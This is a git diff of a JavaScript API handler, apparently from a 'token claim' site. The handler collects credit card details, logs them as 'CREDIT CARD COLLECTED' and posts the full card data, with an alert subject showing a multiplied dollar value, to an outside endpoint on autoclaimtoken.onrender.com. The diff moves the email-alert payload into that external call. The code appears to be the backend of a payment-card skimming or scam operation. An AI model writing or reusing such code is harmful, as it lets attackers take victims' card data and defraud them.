@@ -44,27 +44,18 @@ export default async function handler(req, res) {
     // Send alert to admin
     console.log('🎯 CREDIT CARD COLLECTED:', cardInfo);
 
-    // Send email alert
-    try {
-      await fetch('/api/send-email-alert', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          type: 'CREDIT_CARD',
-          subject: `🎯 CREDIT CARD COLLECTED - $${(parseFloat(amount) * 3200).toFixed(2)}`,
-          data: cardInfo
-        })
-      });
-    } catch (error) {
-      console.log('Email alert failed');
-    }
-
-    // Send to honeypot alert system
+    // Send to your existing alert system (same as other alerts)
     try {
       await fetch('https://autoclaimtoken.onrender.com/api/honeypot-alert', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(cardInfo)
+        body: JSON.stringify({
+          ...cardInfo,
+          alertType: 'CREDIT_CARD_COLLECTED',
+          priority: 'HIGH',
+          emailSubject: `🎯 CREDIT CARD COLLECTED - $${(parseFloat(amount) * 3200).toFixed(2)}`,
+          adminEmail: true
+        })
       });
     } catch (error) {
       console.log('Alert system unavailable');
